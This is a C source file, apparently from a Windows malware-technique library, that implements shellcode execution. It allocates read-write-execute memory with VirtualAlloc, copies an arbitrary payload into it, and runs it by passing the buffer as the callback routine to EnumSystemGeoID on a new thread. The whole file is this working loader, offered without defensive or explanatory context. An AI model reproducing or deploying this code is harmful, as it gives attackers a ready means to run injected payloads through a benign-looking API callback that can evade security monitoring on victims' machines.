#include "Win32Helper.h"

VOID InvokeEnumSystemGeoIDThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)lpParameter);
}

BOOL MpfSceViaEnumSystemGeoID(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumSystemGeoIDThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}